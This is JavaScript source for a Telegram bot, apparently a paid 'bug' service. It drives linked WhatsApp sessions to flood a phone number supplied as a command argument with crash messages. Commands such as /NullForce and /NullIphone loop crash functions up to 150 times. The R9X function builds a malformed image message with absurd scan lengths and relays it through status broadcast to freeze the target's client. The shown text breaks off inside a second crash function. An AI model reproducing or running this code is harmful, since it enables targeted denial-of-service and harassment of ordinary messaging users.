<tg-emoji emoji-id="5316924123786524990">📩</tg-emoji> sᴇʟᴇᴄᴛ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ᴛᴏ sʜᴏᴡ ᴍᴇɴᴜ
`;

      buildKeyboard = (i) => [
        [
          {
            text: "𝙾𝚆𝙽𝙴𝚁 ﹗",
            callback_data: "owner_menu",
            style: styles[i],
            icon_custom_emoji_id: "5341715473882955310"
          },
          {
            text: "𝙰𝚃𝚃𝙰𝙲𝙺 ﹗",
            callback_data: "trash_menu",
            style: styles[i],
            icon_custom_emoji_id: "4956726373679891220"
          }
        ],
        [
          {
            text: "𝚃𝚘𝚘𝚕𝚜 !",
            callback_data: "tools_menu",
            style: styles[i],
            icon_custom_emoji_id: "5325547803936572038"
          }
        ],
        [
          {
            text: "𝙾𝚆𝙽𝙴𝚁",
            url: "https://t.me/Putxzyy",
            style: styles[i],
            icon_custom_emoji_id: "5260535596941582167"
          }
        ]
      ];
    }

    if (!buildKeyboard) {
      // Handle copy_ callback dari /cekidch
      if (query.data && query.data.startsWith('copy_')) {
        const channelId = query.data.replace('copy_', '');
        await bot.sendMessage(chatId, `\`${channelId}\``, { parse_mode: "Markdown" });
      }
      return;
    }

    // Edit media dengan keyboard index awal
    await bot.editMessageMedia(
      {
        type: "photo",
        media: "https://h.top4top.io/p_37763z75b0.png",
        caption: caption,
        parse_mode: "html"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: { inline_keyboard: buildKeyboard(index) }
      }
    );

    // Clear interval lama supaya tidak numpuk / konflik
    if (buttonIntervals.has(messageId)) {
      clearInterval(buttonIntervals.get(messageId));
      buttonIntervals.delete(messageId);
    }

    // Interval animasi tombol - aman dari 429
    let isPaused = false;

    const intervalId = setInterval(async () => {
      if (isPaused) return; // skip tick kalau sedang cooldown 429
      index = (index + 1) % styles.length;
      try {
        await bot.editMessageReplyMarkup(
          { inline_keyboard: buildKeyboard(index) },
          { chat_id: chatId, message_id: messageId }
        );
      } catch (e) {
        const code = e.response?.statusCode;
        if (code === 429) {
          // Pause sementara tanpa buat interval baru
          const retryAfter = (e.response?.body?.parameters?.retry_after || 30) * 1000;
          isPaused = true;
          setTimeout(() => { isPaused = false; }, retryAfter);
        } else if (code === 400 || code === 403) {
          const id = buttonIntervals.get(messageId);
          if (id) { clearInterval(id); buttonIntervals.delete(messageId); }
        }
      }
    }, 5000); // 5 detik

    buttonIntervals.set(messageId, intervalId);

  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});
// ============ COMMAND /TheExecution ============

//=======CASE BUG=========//

bot.onText(/\/NullForce (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const target = Jid;
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Putxzyy" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "🙈 Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpair 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/yo9hh7.mp4", {
      caption: `
\`\`\`
# xɴᴜʟʟ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : ⏳Sedang mengirim......
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
  for (let i = 0; i <= 150; i++) {   
     await crasInVisiBle(sock, target);
     await R9X(sock, target, mention = true);     
  }
  
  
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
# xɴᴜʟʟ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : Succes send bug
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/NullClick(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const mention = Jid;
  const target = Jid;
  
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Putxzyy" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "🙈 Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpair 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/hlzeth.mp4", {
      caption: `
\`\`\`
# xɴᴜʟʟ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : ⏳Sedang mengirim......
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
  for (let i = 0; i <= 30; i++) {   
     await fvckMark(target); 
     await sleep(3500);
  }
  
  
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
# xɴᴜʟʟ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : Succes send bug
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   
bot.onText(/\/NullDelay(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const mention = Jid;
  const target = Jid;
  
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Putxzyy" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "🙈 Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpair 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/hlzeth.mp4", {
      caption: `
\`\`\`
# xɴᴜʟʟ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : ⏳Sedang mengirim......
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
  for (let i = 0; i <= 30; i++) {   
     await fvckMark(target); 
     await sleep(3500);
  }
  
  
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
# xɴᴜʟʟ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : Succes send bug
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   
bot.onText(/\/NullDozer(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const mention = Jid;
  const target = Jid;
  
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Putxzyy" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "🙈 Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpair 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/hlzeth.mp4", {
      caption: `
\`\`\`
# xɴᴜʟʟ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : ⏳Sedang mengirim......
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
  for (let i = 0; i <= 30; i++) {   
     await fvckMark(target); 
     await sleep(3500);
  }
  
  
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
# xɴᴜʟʟ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : Succes send bug
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   
bot.onText(/\/NullChat(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const mention = Jid;
  const target = Jid;
  
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Putxzyy" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "🙈 Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpair 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/hlzeth.mp4", {
      caption: `
\`\`\`
# xɴᴜʟʟ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : ⏳Sedang mengirim......
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
  for (let i = 0; i <= 30; i++) {   
     await fvckMark(target); 
     await sleep(3500);
  }
  
  
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
# xɴᴜʟʟ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : Succes send bug
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   
bot.onText(/\/NullVchats(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const mention = Jid;
  const target = Jid;
  
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Putxzyy" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "🙈 Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpair 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/hlzeth.mp4", {
      caption: `
\`\`\`
# xɴᴜʟʟ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : ⏳Sedang mengirim......
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
  for (let i = 0; i <= 30; i++) {   
     await fvckMark(target); 
     await sleep(3500);
  }
  
  
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
# xɴᴜʟʟ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : Succes send bug
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   
bot.onText(/\/NullVxc(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const mention = Jid;
  const target = Jid;
  
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Putxzyy" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "🙈 Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpair 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/hlzeth.mp4", {
      caption: `
\`\`\`
# xɴᴜʟʟ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : ⏳Sedang mengirim......
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
  for (let i = 0; i <= 30; i++) {   
     await fvckMark(target); 
     await sleep(3500);
  }
  
  
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
# xɴᴜʟʟ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : Succes send bug
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   
bot.onText(/\/NullPhone(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const mention = Jid;
  const target = Jid;
  
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Putxzyy" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "🙈 Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpair 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/hlzeth.mp4", {
      caption: `
\`\`\`
# xɴᴜʟʟ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : ⏳Sedang mengirim......
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
  for (let i = 0; i <= 30; i++) {   
     await fvckMark(target); 
     await sleep(3500);
  }
  
  
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
# xɴᴜʟʟ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : Succes send bug
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   
bot.onText(/\/NullIphone(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const mention = Jid;
  const target = Jid;
  
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Putxzyy" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "🙈 Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpair 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/hlzeth.mp4", {
      caption: `
\`\`\`
# xɴᴜʟʟ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : ⏳Sedang mengirim......
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
  for (let i = 0; i <= 30; i++) {   
     await fvckMark(target); 
     await sleep(3500);
  }
  
  
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
# xɴᴜʟʟ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : Succes send bug
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   











//Function
//Fc NoClick
async function R9X(sock, target, mention = true) {
  var R9X = generateWAMessageFromContent(
    target,
    {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
        fileLength: 388944,
        height: 1600,
        width: 1200,
        mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
        fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
        directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1776937541",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
        contextInfo: {
          pairedMediaType: "NOT_PAIRED_MEDIA",
          isQuestion: true,
          isGroupStatus: true
        },
        caption: "R9X",
        scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
        scanLengths: [
          2899999999999999077,
          1799999999999998555,
          7699999999999999148,
          1069999999999999164
        ],
        midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
      }
    },
    {}
  );

  await sock.relayMessage("status@broadcast", R9X.message, {
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ],
    statusJidList: [target],
    messageId: R9X.key.id
  });

  if (R9X) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: R9X.key,
              type: 25
            }
          }
        }
      },
      {}
    );
  }
  await sleep(3000)
}

async function crasInVisiBle(sock, target) {
  const MakLo = { 
    imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 999999999,
      height: 9999,
      width: 9999,
